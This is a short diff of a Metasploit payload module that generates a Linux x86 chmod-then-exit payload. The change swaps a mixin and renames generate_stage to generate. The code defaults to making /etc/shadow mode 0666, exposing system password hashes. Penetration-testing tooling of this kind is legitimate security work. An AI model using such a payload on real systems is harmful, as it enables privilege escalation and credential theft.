@@ -13,7 +13,7 @@ module MetasploitModule
   CachedSize = 36
 
   include Msf::Payload::Single
-  include Msf::Payload::Linux
+  include Msf::Payload::Linux::X86::Prepends
 
   def initialize(info = {})
     super(merge_info(info,
@@ -32,7 +32,7 @@ module MetasploitModule
   end
 
   # Dynamically generates chmod(FILE, MODE) + exit()
-  def generate_stage(opts={})
+  def generate(opts={})
     file    = datastore['FILE'] || '/etc/shadow'
     mode	= (datastore['MODE'] || "0666").oct
 
